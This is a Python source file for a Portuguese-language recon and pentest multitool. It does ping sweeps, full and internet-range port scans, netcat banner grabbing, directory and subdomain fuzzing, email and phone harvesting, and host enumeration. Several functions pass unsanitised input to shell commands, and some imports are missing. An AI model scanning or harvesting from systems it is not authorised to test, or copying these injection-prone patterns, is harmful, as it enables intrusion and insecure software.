#!/usr/bin/env python3
version = "v4.2dev"

#########################################
## IMPORTAÇÃO DE BIBLIOTECAS PRINCIPAL ##
#########################################
import os
import sys
import socket
import signal
import ipaddress
import time as t
import threading as th
import multiprocessing
from concurrent.futures import ThreadPoolExecutor

###########################################################
## BANNER PRINCIPAL DO PROGRAMA, EXIBINDO A VERSÃO ATUAL ##
###########################################################
bann = f'''\033[1;33m
888  888  888  .d88b.   8888b.  88888b.   .d88b.  888  888  888
888  888  888 d8P  Y8b     "88b 888 "88b d88""88b 888  888  888
888  888  888 88888888 .d888888 888  888 888  888 888  888  888
Y88b 888 d88P Y8b.     888  888 888 d88P Y88..88P Y88b 888 d88P
 "Y8888888P"   "Y8888  "Y888888 88888P"   "Y88P"   "Y8888888P"
\033[0;31m (\\ (\\\033[m \033[1;35m                         \033[m\033[1;33m888\033[m                 \033[7;32m{version}\033[m
\033[0;31m ( ^.^)\033[m\033[1;35m-------------------------\033[m\033[1;33m888\033[m 
\033[0;31m O_(")(")  \033[m                     \033[1;33m888\033[m\n           '''

####################################################
## GRUPO DE VARIÁVEIS QUE SÃO REPETIDAS NO CODIGO ##
####################################################
press = '\033[7;31m(Pressione qualquer tecla para voltar ao menu inicial)\033[m'
Ctrl_C = 'Você pressionou Ctrl+C para interromper o programa!'
dir = 'mkdir -p ARQ'
SIGNALHOSTDISCOVERY = True

############################
## CRIA O DIRETÓRIO ./ARQ ##
############################
os.system(dir)

#########################################
## FUNÇÃO PARA INTERRUPÇÃO DO PROGRAMA ##
#########################################
def handler(signum, frame):
        global pool
        try:
            pool.terminate()
        except Exception as e:
            pass
        except KeyboardInterrupt:
            pass
        finally:
            sys.exit(0)

signal.signal(signal.SIGINT, handler)

#############################################################
## FUNÇÃO QUE BUSCA INTERFACES E CRIA UMA LISTA DE SELEÇÃO ##
#############################################################
def interfaces():

    ########################################
    ## CRIA UM MENU DE INTERFACES DE REDE ##
    ########################################
    try:
        
        interfaces = []

        ########################################################
        ## VERIFICA AS INTERFACES NO DIRETÓRIO A NIVEL KERNEL ##
        ########################################################
        for interface_name in os.listdir('/sys/class/net'): 
            
            if interface_name == 'lo':
                continue
            interfaces.append(interface_name)
       
        if not interfaces:
            print("Nenhuma interface de rede encontrada.")
            input(press)
            main()

        ###################################################    
        ## PARA CADA INTERFACE, E CRIADO UM ITEM NO MENU ##
        ###################################################
        print("\nSelecione a interface de rede:")
        for i, interface in enumerate((interfaces), 1):
            print(f"\033[0;34m[{i}]\033[m - {interface}")

        while True:
            try:
                escolha = int(input("Digite a opção: "))
                if escolha < 0 or escolha > len(interfaces):
                    raise ValueError
                break
            except ValueError:
                print("Opção inválida.")
        
        ###################################
        ## CASO SEJA "0" RETORNA AO MENU ##
        ###################################
        if escolha == 0:
            main()
        
        selected_interface = interfaces[escolha - 1]

        return selected_interface

    except KeyboardInterrupt:
        print('\n'+Ctrl_C)
        quit()

#-----------------------------------------------------------------------------
#############################################
## FUNÇÃO PARA DESCOBERTA DE HOSTS NA REDE ##
#############################################
def host_discovery():

    ###################################################
    ## DEFINE O NÚMERO MÁXIMO DE THREADS SIMULTÂNEAS ##
    ###################################################
    max_threads = 160
    thread_semaphore = th.Semaphore(max_threads)

    ##########################################################
    ## EXECUTA O COMANDO PING + EXIBIR E SALVAR OS HOSTS-UP ##
    ##########################################################
    def ping_host(ip, progress_bar):
        with thread_semaphore:
            ip = str(ip)
            response = os.system(f'ping -c 2 -W 2 {ip} > /dev/null 2>&1')

            if response == 0:
                tqdm.write(f"[+] Host ativo: {ip}")  # Usa tqdm.write para evitar conflito com a barra
                with open('ARQ/hosts.txt', 'a') as f:
                    f.write(f'{ip}\n')
            
            progress_bar.update(1)  # Atualiza a barra de progresso

    #########################################################
    ## CRIA UMA POOL PARA GERENCIAR A EXECUÇÃO DOS THREADS ##
    #########################################################
    def worker(subnet, progress_bar):
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            list(executor.map(lambda ip: ping_host(ip, progress_bar), subnet))

    ##########################################
    ## INPUT PARA RECEBER A MÁSCARA DE REDE ##
    ##########################################
    network = input("Digite a máscara de rede (Exemplo: 10.0.0.0/16): ")
    os.system('rm -f ARQ/hosts.txt')  # Limpa o arquivo anterior

    all_hosts = list(ipaddress.IPv4Network(network, strict=False).hosts())
    total_hosts = len(all_hosts)  # Total de hosts para progresso

    ######################################################################
    ## DEFINE O NÚMERO DE PROCESSOS DE ACORDO COM A QUANTIDADE DE HOSTS ##
    ######################################################################
    num_processes = multiprocessing.cpu_count()
    chunk_size = len(all_hosts) // num_processes

    ##################################
    ## DISTRIBUIÇÃO ENTRE PROCESSOS ##
    ##################################
    processes = []
    progress_bar = tqdm(total=total_hosts, desc="Verificando hosts", unit="host")  # Barra de progresso
    
    for subnet in [all_hosts[i:i + chunk_size] for i in range(0, len(all_hosts), chunk_size)]:
        p = multiprocessing.Process(target=worker, args=(subnet, progress_bar))
        processes.append(p)
        p.start()

    ###################################
    ## AGUARDA OS PROCESSOS TERMINAR ##
    ###################################
    for p in processes:
        p.join()
    
    progress_bar.close()  # Fecha a barra de progresso

    input("Pressione qualquer tecla para continuar...")
    main()


#-----------------------------------------------------------------------------
############################################
## PORTAS A SEREM VERIFICADAS NO PORTSCAN ##
############################################
PORTAS_PRINCIPAIS = range(1,65535)

########################################################################
## FUNÇÃO QUE REALIZA A TENTATIVA DE CONEXÃO DE ACORDO COM HOST/PORTA ##
########################################################################
def scan(host, porta):
        try:
            l = len(str(porta))
            espaco = " " * (10 - l)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5.5)
                if s.connect_ex((host, int(porta))) == 0:
                    with open("ARQ/portscan.txt", "a") as f:
                        try:
                            service = socket.getservbyport(porta)
                            print(f"{str(porta)} / TCP{espaco}{service}")
                            print(f"{str(porta)} / TCP{espaco}{service}", file=f)
                        except socket.error:
                            print(str(porta) + f" / TCP")
                            print(str(porta) + f" / TCP", file=f)
        except Exception as e:
            pass

##################################################################################
## ESTA FUNÇÃO FAZ UM PORTSCAN DE ACORDO COM A LISTA GERADO PELO HOST DISCOVERY ##
##################################################################################
def big_scan():

    ##############################################################
    ## FUNÇÃO PRINCIPAL QUE REALIZA O GERENCIAMENTO DO PORTSCAN ##
    ##############################################################
    def uniq(host):
        try:
            with open("ARQ/portscan.txt", "a") as f:
                print("\n[+] Host: " + host)
                print("\n[+] Host: " + host, file=f)
                print("PORTA          SERVIÇO")
                print("PORTA          SERVIÇO", file=f)
            host_ip = socket.gethostbyname(host)

        except socket.gaierror:
            return

        global pool
        pool = multiprocessing.Pool(processes=220)

        try:
            for porta in PORTAS_PRINCIPAIS:
                pool.apply_async(scan, args=(host_ip, int(porta)))

            pool.close()
            pool.join()
        
        except Exception as e:
            pool.terminate()
            pool.join()

    ###########################################################
    ## INTERAÇÃO COM O USUÁRIO PARA DIRECIONAMENTO DA FUNÇÃO ##
    ###########################################################
    os.popen('rm ARQ/portscan.txt 2>/dev/null')
    sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')

    if sit_scan.lower() == 'h':
        host = input("Digite o endereço IP ou domínio: ")
        uniq(host)
    elif sit_scan.lower() == 'l':
        with open('ARQ/hosts.txt','r') as file:
            for line in file:
                uniq(line.strip())


#-----------------------------------------------------------------------------
def world_scan():
    #####################################################
    ## DEFINE O NÚMERO DE THREADS E CRIA UM "SEMAFORO" ##
    #####################################################
    MAX_THREADS = 600
    thread_semaphore = th.Semaphore(MAX_THREADS)

    ########################################################################
    ## FUNÇÃO QUE REALIZA A TENTATIVA DE CONEXÃO DE ACORDO COM HOST/PORTA ##
    ########################################################################
    def scan(ip,porta):
        try:
            host = str(ip)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, porta))
            if result == 0:
                print(f"Port {porta} is open on {host}")
                with open(f'World_Port_{porta}.txt','a') as f:
                    print(host, file=f)
            sock.close()
        except Exception as e:
            print(f"Error scanning {ip}: {e}")
        finally:
            ############################################################
            ## Sempre libere o semáforo, mesmo se ocorrer uma exceção ##
            ############################################################
            thread_semaphore.release()

    def worker(ips,porta):
        threads = []
        for ip in ips:
            ## Adquire o semáforo antes de criar uma nova thread ##
            thread_semaphore.acquire()
            t = th.Thread(target=scan, args=(ip,porta))
            t.start()
            threads.append(t)
        
        # Aguardar todas as threads terminarem
        for t in threads:
            t.join()

    ips = input('Digite a faixa de IP (Ex: xx.xx.xx.xx/xx): ')
    porta = int(input('Qual porta? '))

    ####################################################
    ## CRIA A REDE DE ACORDO COM A ENTRADA DO USUÁRIO ##
    ####################################################
    network = ipaddress.ip_network(ips, strict=False)
    ips_list = list(map(str, network.hosts()))

    # Dividindo a lista de IPs em partes para cada processo
    num_processes = multiprocessing.cpu_count()
    chunk_size = len(ips_list) // num_processes
    chunks = []
    for i in range(0, len(ips_list), chunk_size):
        chunks.append(ips_list[i:i+chunk_size])

    # Iniciando a barra de progresso fora do loop de chunks
    total_ips = 0
    for chunk in chunks:
        total_ips += len(chunk)


    # Iniciando processos para escanear em paralelo
    processes = []
    for chunk in chunks:
        p = multiprocessing.Process(target=worker, args=(chunk,porta))
        p.start()
        processes.append(p)

    # Aguardando todos os processos terminarem
    for p in processes:
        p.join()



#-----------------------------------------------------------------------------
######################################################################
## ENVIA UMA CONEXÃO VIA NETCAT PARA RETORNAR UM POSSÍVEL CABEÇALHO ##
######################################################################
def nc_get():
    # Limpa o diretório e garante sua existência
    os.system('rm -rf ARQ/HEAD/* 2>/dev/null')
    os.makedirs("ARQ/HEAD", exist_ok=True)

    print('No código, existe a função nc(), mais lenta e verifica todas as portas.')

    # Função para enviar requisição usando netcat
    def get(host, porta, servico):
        try:
            comando = f'echo -e "\\n" | nc -vn -w 10 {host} {porta} 2>&1'
            resultado = os.popen(comando).read()
            caminho_arquivo = f"ARQ/HEAD/{host}"

            # Escreve o resultado no arquivo
            with open(caminho_arquivo, "a") as arquivo_respostas:
                resposta = f"[+] Host: {host}    Porta: {porta}    Serviço: {servico}\n{resultado}\n"
                arquivo_respostas.write(resposta)
                print(resposta)

            # Realiza download da página caso seja um serviço HTTP/HTTPS
            if porta in ["80", "443"]:
                wget_pg(host, porta)

        except Exception as e:
            print(f"Erro ao executar o comando nc: {e}")

    # Função para realizar o download de páginas web
    
    # Lê os resultados do portscan e executa a função get para cada host/porta
    try:
        with open("ARQ/portscan.txt", "r") as arquivo:
            linhas = arquivo.read().strip().split('\n')
            host = None

            for linha in linhas:
                if '[+] Host:' in linha:
                    host = linha.split(':')[-1].strip()
                elif 'PORTA' not in linha and '/' in linha:
                    porta, servico = map(str.strip, linha.split('/')[:2])
                    if host:
                        th.Thread(target=get, args=(host, porta, servico)).start()
    except FileNotFoundError:
        print("Arquivo ARQ/portscan.txt não encontrado.")
    except Exception as e:
        print(f"Erro ao processar ARQ/portscan.txt: {e}")

    input("Pressione Enter para continuar...")
    main()

def wget_pg(host, porta):
        try:
            os.makedirs(f"ARQ/WEB/{host}", exist_ok=True)
            os.system(f'wget --no-check-certificate --mirror --convert-links '
                      f'--adjust-extension --page-requisites --timeout=10 '
                      f'http://{host}:{porta} -P ARQ/WEB/')
            os.system(f'chmod 777 -R ARQ/WEB/{host}')
        except Exception as e:
            print(f"Erro ao realizar download do site {host}:{porta} - {e}")

def cert_subdomain():
    target_domain = input('Digite o dominio: ')
    target = target_domain.replace('www.', '').split('/')[0]

    try:
        req = requests.get(f"https://crt.sh/?q=%.{target}&output=json")
        req.raise_for_status()
    except requests.RequestException:
        print("[X] Information not available!")

    subdomains = sorted({value['name_value'] for value in req.json()})

    print(f"\n[!] TARGET: {target} [!] \n")

    for subdomain in subdomains:
        print(subdomain)



#-----------------------------------------------------------------------------
################################################
## COMANDO PARA FAZER DIRB FUZZER E SUBLISTER ##
################################################
def webdiscovery():
    def load_wordlist(wordlist):
        try:
            with open(wordlist, "r") as f:
                return [line.strip() for line in f]
        except FileNotFoundError:
            print(f"Wordlist não encontrada: {wordlist}")
        return []

    def threaded_execution(target, items, desc, threads=50):
        q = Queue()
        for item in items:
            q.put(item)
        progress = tqdm(total=len(items), desc=desc)

        def worker():
            while not q.empty():
                target(q.get())
                progress.update(1)
                q.task_done()

        for _ in range(threads):
            th.Thread(target=worker).start()
        q.join()
        progress.close()

    def dirb(url, wordlist):
        print(f"Fuzzing diretórios em {url} com a wordlist: {wordlist}")
        def fuzz(endpoint):
            try:
                r = requests.get(f"{url}/{endpoint}", timeout=5)
                if r.status_code in [200, 403]:
                    print(f"[{r.status_code}] {url}/{endpoint}")
            except requests.RequestException:
                pass
        threaded_execution(fuzz, load_wordlist(wordlist), "Fuzzing diretórios")

    def subenum(domain, wordlist):
        print(f"Enumeração de subdomínios em {domain} com a wordlist: {wordlist}")
        def resolve(sub):
            try:
                ip = socket.gethostbyname(f"{sub}.{domain}")
                print(f"[Resolvido] {sub}.{domain} -> {ip}")
            except socket.gaierror:
                pass
        threaded_execution(resolve, load_wordlist(wordlist), "Enumeração de subdomínios")


    path = input("Path do SecList ou 'N' para baixar: ")
    if path.lower() == 'n':
        os.system("wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && unzip SecList.zip && rm -f SecList.zip")
        path = os.path.join(os.getcwd(), "SecLists-master")

    if os.path.exists(path):
        url = input("URL base (ex: http://example.com): ").strip()
        if url:
            domain = url.replace("http://", "").replace("https://", "")
            for root, _, files in os.walk(path):
                for file in files:
                    if file.endswith(".txt"):
                        wordlist = os.path.join(root, file)
                        dirb(url, wordlist)
                        subenum(domain, wordlist)
    else:
        print("Caminho inválido ou SecLists não encontrado.")



#-----------------------------------------------------------------------------
def link():
    
    # Função para realizar o crawling na URL
    def crawl(url):
        try:
            response = requests.get(url)
            response.raise_for_status()  # Verifica se há erros no status
        except (SSLError, requests.exceptions.RequestException) as e:
            print(f"Erro ao acessar {url}: {e}")
            return []
        
        soup = BeautifulSoup(response.content, 'html.parser')
        links = {urljoin(url, link['href']) for link in soup.find_all('a') if 'href' in link.attrs}
        return links

    # Função para extrair informações da URL
    def ext_info(url):
        durls = []
        emails = set()
        tel = set()
        forms = []
        subdomains = set()

        try:
            response = requests.get(url)
            response.raise_for_status()
        except (SSLError, requests.exceptions.RequestException) as e:
            print(f"Erro ao acessar {url}: {e}")
            return durls, emails, tel, forms, subdomains

        soup = BeautifulSoup(response.content, 'html.parser')

        # Extração de URLs
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.startswith(('/', '?')):
                durls.append(urljoin(url, href))

        # Extração de emails e telefones
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.startswith("mailto:"):
                emails.add(href[7:])
            elif href.startswith("tel:") or "phone=" in href:
                tel.add(href[4:])

        # Extração de formulários
        forms.extend(url for _ in soup.find_all('form'))

        # Extração de subdomínios
        for link in soup.find_all('a', href=True):
            parsed_uri = urlparse(link['href'])
            domain = parsed_uri.netloc.split(':')[0]
            if domain:
                subdomains.add(domain)

        return durls, emails, tel, forms, subdomains

    # Função que processa cada URL
    def process_url(url, visited_urls):
        if url in visited_urls:
            return

        visited_urls.add(url)
        divurls = crawl(url)
        print(f"\n\nEfetuando WebCrawling em {url}")

        for divurl in sorted(divurls):
            print(f'\n{"="*92}>> {t.strftime("%d/%m/%y %H:%M:%S")}')
            print(divurl)
            print(f'{"="*92}>>')

            durls, emails, tel, forms, subdomains = ext_info(divurl)

            if durls:
                print('\nURLs INTERNAS:')
                for u in durls:
                    print(u)

            if emails:
                print('\nEMAILS:')
                for email in emails:
                    print(email)

            if tel:
                print('\nTELEFONES:')
                for phone in tel:
                    print(phone)

            if forms:
                print('\nFORMULÁRIOS:')
                for form in forms:
                    print(form)

            if subdomains:
                print('\nSUBDOMÍNIOS:')
                for subdomain in subdomains:
                    print(subdomain)

    # Função principal de processamento
    def links(target):
        visited_urls = set()
        url_to_process = ['http://' + target]

        with open(f'Crawl/{target}_craw.txt', 'w') as f:
            while url_to_process:
                current_url = url_to_process.pop()
                f.write(process_url(current_url, visited_urls))

    # Preparação do ambiente de saída
    os.system('rm -rf Crawl')
    t.sleep(1)
    os.system('mkdir Crawl')

    # Escolha de host ou lista de sites
    sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ').lower()

    if sit_scan == 'h':
        target = input('Digite o endereço do site (ex: site.com):\n')
        links(target)

    elif sit_scan == 'l':
        for ip in os.listdir("ARQ/WEB"):
            parse_ip = ip.split(':')[0]
            result = os.system(f'ping -c 3 -W 1 {parse_ip} > /dev/null')

            if result == 0:
                links(parse_ip)
                nsit = input(f'A busca em {parse_ip} terminou. Deseja continuar? (S/N): ').lower()
                if nsit != 's':
                    break


#-----------------------------------------------------------------------------
##################################################################
## FAZ UMA VERIFICAÇÃO NOS SITES BAIXADOS, BUSCANDO FORMULÁRIOS ##
##################################################################            
def auto_web():
    os.makedirs("ARQ/WEB", exist_ok=True)
    sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ').lower()
    if sit_scan.lower() == 'h':
        url = input('Digite a URL a ser Verificada:')
        wget_pg(url, 80)
    elif sit_scan.lower() == 'l':
        ips = os.popen(r'grep -iR -A 5 "<form" ARQ/WEB | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u').read().split()

        try:
            #########################################################
            ## FAZ UMA VARREDURA NO ARQUIVO QUE TIVER "index.html" ##
            #########################################################
            for ip in ips:
                caminho_html = f'ARQ/WEB/{ip}/index.html'
                with open(caminho_html, 'r', encoding='utf-8') as arquivo:
                    conteudo_html = arquivo.read()
                    soup = BeautifulSoup(conteudo_html, 'html.parser')
                    formularios = soup.find_all('form', {'action': True, 'method': True})

                    if ip and formularios:
                        print('---------------------------------------------------------')
                        print(f'\nAnalisando {ip}:\n')
                        soup = BeautifulSoup(conteudo_html, 'html.parser')
                        formularios = soup.find_all('form', {'action': True, 'method': True})

                        for formulario in formularios:
                            print(f'Atributo action: {formulario["action"]}')
                            print(f'Atributo method: {formulario["method"]}')
                            print(f'Conteúdo do formulário:')
                            print(formulario.prettify())
                            print('---------------------------------------------------------\n')

            ########################################################
            ## FAZ UMA VARREDURA NO ARQUIVO QUE TIVER "index.php" ##
            ########################################################
            for ip in ips:
                caminho_html = f'ARQ/WEB/{ip}/index.php'
                with open(caminho_html, 'r', encoding='utf-8') as arquivo:
                    conteudo_html = arquivo.read()
                    soup = BeautifulSoup(conteudo_html, 'html.parser')
                    formularios = soup.find_all('form', {'action': True, 'method': True})

                    if ip and formularios:
                        print('---------------------------------------------------------')
                        print(f'\nAnalisando {ip}:\n')
                        soup = BeautifulSoup(conteudo_html, 'html.parser')
                        formularios = soup.find_all('form', {'action': True, 'method': True})

                        for formulario in formularios:
                            print(f'Atributo action: {formulario["action"]}')
                            print(f'Atributo method: {formulario["method"]}')
                            print(f'Conteúdo do formulário:')
                            print(formulario.prettify())
                            print('---------------------------------------------------------\n')

        except FileNotFoundError:
            pass
        input("Pressione Enter para continuar...")
        main()
    
    else:
        main()

#-----------------------------------------------------------------------------
def ferramentas():
    print("Esta opção irá instalar um conjunto de ferramentas uteis para RECON + PENTEST.")
    sit_tool = input('Deseja continuar? (S/N) ')
    

    #separar as ferramentas
    #verificar se root ou nao
    #verificar sistema operacional
    #verificar se as ferramentas estao instaladas
    #fazer um menu de check
    #instalar cada ferramenta
    try:
        pass
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#-----------------------------------------------------------------------------
def backup():
    print("Este processo poderá levar MUITO tempo dependendo da quantidade de arquivos.")
    sit_bak = input('Deseja realmente fazer BKP do usuário desta estação? (S/N) ')
    try:
        if(sit_bak.lower() == "s"):
            dir = input("Digite o diretório a ser feito o BKP:\n")
            print('Fazendo BACKUP ...')
            t.sleep(2)
            os.system(f'cp -v -r {dir} /home/$USER/Backup')
        else:
            input(press)
            main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#-----------------------------------------------------------------------------
def clonar():
    '''
    df -h
umount -t ext4 /dev/sdx && mkfs.ext4 /dev/sdx
	dd if=/deb/sdx of=/dev/sdy bs=1M conv=noerror
sudo blkid
sudo nano /etc/fstab
    '''
    pass


#-----------------------------------------------------------------------------
def cron():
    print('''
Para configurar uma rotina C[R]ON:

\033[1;33m*  *  *  *  *  /usr/bin/python3 /caminho/do/script.*\033[m
\033[0;31m-  -  -  -  -     |                                |\033[m
\033[0;31m|  |  |  |  |     +---\033[m Caminho do Executável\033[m       \033[0;31m+---\033[m Extensão do arquivo a ser Executado. Ex: .sh .c .py
\033[0;31m|  |  |  |  |
\033[0;31m|  |  |  |  +----------------------\033[m Dia da Semana (0-6) [Sendo 0 = Domingo]
\033[0;31m|  |  |  +-------------------------\033[m Mês (1-12)
\033[0;31m|  |  +----------------------------\033[m Dia do Mês (1-31)
\033[0;31m|  +-------------------------------\033[m Hora (0-23)
\033[0;31m+----------------------------------\033[m Minutos (0-59) se quiser a cada 15min use: '/15'

Exemplo:
\033[7;33m*/15 * * * * /usr/bin/python3 /caminho/do/weapow.py\033[m   [A cada 15min EXEC o arquivo weapow.py usando Python3]
\033[7;33m30 15 14 6 * /tmp/backup.sh\033[m                        [No dia 14JUN às 15:30 EXEC o backup.sh]


Você pode conferir a alteração com o comando: "\033[0;34m$ crontab -e\033[m"

''')
    sit_cron = input("Deseja substituir as configurações do C[R]ON? (S/N)")
    if(sit_cron.lower() == "s"):
        try:
            enter = input("Digite a entrada do C[R]ON:\n")
            os.system(f'echo "{enter}" | crontab -')
            print('C[R]ON configurado corretamente.')
            input(press)
            main()
        except TypeError:
            print("Faltam [Argumentos] para entrada")
            input(press)
            main()
    else:
        input(press)
        main()


#-----------------------------------------------------------------------------
def finder():
    try:
        find = str(input('Digite o arquivo que deseja encontrar: '))
        print('Procurando com FIND:')
        print('==================================================================================\n')
        os.system(f' find / -name {find} 2>/dev/null | grep {find}')
        print('Procurando com GREP:')
        print('==================================================================================\n')
        os.system(f' grep -iRl {find} / 2>/dev/null')
        print('\n==================================================================================')
        print('Fim da busca!\n')
        input(press)
        main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#-----------------------------------------------------------------------------
def infosys():
    try:
        output = ''

        output += '\n'
        output += 'WHOAMI =======================================================\n'
        output += '            User: {}'.format(os.popen('whoami').read())
        output += os.popen('hostnamectl').read()
        output += '      IPAddress : {}'.format(os.popen("ip addr | awk '/inet / {if (++n == 2) print $2}'").read())
        output +="\n   Current Path : {}".format(os.popen('pwd').read())
        output +='===============================================================\n'

        output += '\n'
        output += 'ID ============================================================\n'
        output += os.popen('id').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'UNAME =========================================================\n'
        output += os.popen('uname -a').read()
        output += os.popen('cat /proc/cmdline').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'TTY +==========================================================\n'
        output += os.popen('who').read()
        output += os.popen('cat /proc/consoles').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'CPU ===========================================================\n'
        output += os.popen('cat /proc/cpuinfo | grep "model name" | uniq').read()
        output += os.popen(''' cat /proc/cpuinfo | awk '/cpu cores/ {gsub("cpu cores", "Cores"); print}' | uniq''').read()
        output += os.popen(''' cat /proc/cpuinfo | awk '/siblings/ {gsub("siblings", "Threads"); print}' | uniq''').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'MEMÓRIA ========================================================\n'
        output += os.popen('cat /proc/meminfo | grep MemTotal').read()
        output += os.popen('cat /proc/meminfo | grep MemFree').read()
        output += os.popen('cat /proc/meminfo | grep MemAvailable').read()
        output += os.popen('cat /proc/meminfo | grep SwapTotal').read()
        output += os.popen('cat /proc/meminfo | grep SwapFree').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'REDES =========================================================\n'
        output += os.popen('ip addr').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'NETSTAT =======================================================\n'
        output += os.popen('netstat -ano').read()
        output += '\n'
        output += os.popen('netstat -nr').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'ROTAS =========================================================\n'
        output += os.popen('cat /proc/net/route').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'SISTEMAS ======================================================\n'
        output += os.popen('df -h').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'PARTIÇÕES =====================================================\n'
        output += os.popen('lsblk -p -f -o NAME,FSTYPE,LABEL,UUID,SIZE,TYPE,TRAN,MODE').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'USB ===========================================================\n'
        output += os.popen('cat /etc/modprobe.d/blacklist.conf ').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'DISPOSITIVOS ==================================================\n'
        output += os.popen('cat /proc/devices').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'LSPCI =========================================================\n'
        output += os.popen('lspci').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'LSUSB =========================================================\n'
        output += os.popen('lsusb').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'LSLOGINS ======================================================\n'
        output += os.popen('lslogins').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'CAPTIVEF ======================================================\n'
        output += os.popen('echo Travando o programa.').read()
        #output += os.popen('getcap -r / 2>/dev/null').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'VARIAVEIS DE AMBIENTE =========================================\n'
        output += os.popen('env').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'PROCESSOS =====================================================\n'
        output += os.popen('ps axjf').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'SERVIÇOS ======================================================\n'
        output += os.popen('systemctl --type=service --state=active | grep ^').read()
        output += '===============================================================\n'


        prog = input('Deseja exibir os programas instalados? (S/N) ')
        if(prog.lower() == "s"):
            output += '\n'
            output += 'PROGRAMAS INSTALADOS ===========================================\n'
            output += os.popen('dpkg --list | grep ^ii.').read()
            output += '===============================================================\n'

        output += '\n'
        output += 'BASH HISTORY===================================================\n'
        output += 'O histórico do BASH deve ser salvo manualmente por enquanto!\n'
        output += 'Use o comando: $ history\n'
        output += '===============================================================\n'

        print(output)

        sit_audi = input('Deseja salvar em arquivo? (S/N) ')
        if(sit_audi.lower() == "s"):
            os.system('rm -rf ARQ/auditoria.txt')
            with open('ARQ/auditoria.txt', 'w') as file:
                file.write(output)
            print('Seu Arquivo foi gerado com Sucesso!')
            input(press)
            main()
        else:
            input(press)
            main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)
    except FileNotFoundError:
        os.system(dir)
        with open('ARQ/auditoria.txt', 'w') as file:
                file.write(output)
        print('Seu Arquivo foi gerado com Sucesso!')
        input(press)
        main()


#-----------------------------------------------------------------------------
def config():
    #############################################
    ## Função para exibir o cabeçalho ##
    #############################################
    def display_header(ver):
        print(f'''\033[1;33m
    .d8888b.                     .d888 d8b             88888888888                888
    d88P  Y88b                   d88P"  Y8P                 888                    888
    888    888                   888                        888                    888
    888         .d88b.  88888b.  888888 888  .d88b.         888   .d88b.   .d88b.  888
    888        d88""88b 888 "88b 888    888 d88P"88b        888  d88""88b d88""88b 888
    888    888 888  888 888  888 888    888 888  888        888  888  888 888  888 888
    Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 888
    "Y8888P"   "Y88P"  888  888 888    888  "Y88888        888   "Y88P"   "Y88P"  888
                                                888
                                            Y8b d88P       \033[0;31m>Esta função precisa de Atenção!\033[m
                                            "Y88P"                            \033[7;32m{ver}\033[m''')

    #############################################
    ## Função para exibir o menu ##
    #############################################
    def display_menu():
        print(''' MENU:
        \033[0;34m[1]\033[m - Criar usuário em RBASH
        \033[0;34m[2]\033[m - Permitir BASH padrão
        \033[0;34m[3]\033[m - Restringir TODOS os comandos
        \033[0;34m[4]\033[m - Config SSH
        \033[0;34m[5]\033[m - Configurar IP
        \033[0;34m[6]\033[m - xxx
        \033[0;34m[7]\033[m - xxx
        \033[0;34m[8]\033[m - xxx
        \033[0;34m[9]\033[m - xxx
        \033[0;34m[10]\033[m- xxx
        ''')

    #############################################
    ## Função para criar usuário RBASH ##
    #############################################
    def create_rbash_user():
        user = input('Qual o usuário a ser configurado? ')
        senha = g.getpass("Digite a senha: ")
        os.system(f" useradd -m -s /bin/rbash {user}")
        os.system(f"echo '{user}:{senha}' | chpasswd")
        os.system(f" chown root: /home/{user}/.profile")
        os.system(f" chown root: /home/{user}/.bashrc")
        os.system(f" chmod 755 /home/{user}/.profile")
        os.system(f" chmod 755 /home/{user}/.bashrc")
        print(f"Usuário '{user}' criado com sucesso, senha definida e permissões ajustadas.")

    #############################################
    ## Função para permitir BASH padrão ##
    #############################################
    def allow_default_bash():
        user = input('Qual o usuário a ser configurado? ')
        os.system(f" usermod --shell /bin/bash {user}")

    #############################################
    ## Função para bloquear comandos ##
    #############################################
    def block_commands():
        if os.path.exists('/usr/share/block'):
            print("O script já foi executado anteriormente. Evitando repetição.")
            input(press)
            return
        
        comandos = os.popen('apropos ""').read().splitlines()
        first_names = [line.split()[0] for line in comandos if line and not any(cmd in line for cmd in ["cat", "ls", "cd", "exit"])]
        
        with open('block', 'w') as block_file:
            for name in first_names:
                block_file.write(name + '\n')
        
        sita = input('Deseja confirmar o bloqueio? (S/N): ')
        if sita.lower() == 's':
            user = input('Digite o usuário: ')
            dir = f'/home/{user}/.bashrc'
            os.system(' mv block /usr/share/block')
            os.system(f'''echo 'comandos=($(cat /usr/share/block))' |  tee -a {dir} > /dev/null''')
            os.system(f'''echo 'for comando in "${{comandos[@]}}"; do' |  tee -a {dir} > /dev/null''')
            os.system(f'''echo '  alias "$comando"="echo 'Comando bloqueado'"' |  tee -a {dir} > /dev/null''')
            os.system(f'''echo 'done' |  tee -a {dir} > /dev/null''')
            print("Arquivo modificado com sucesso!")

    #############################################
    ## Função para configurar SSH ##
    #############################################
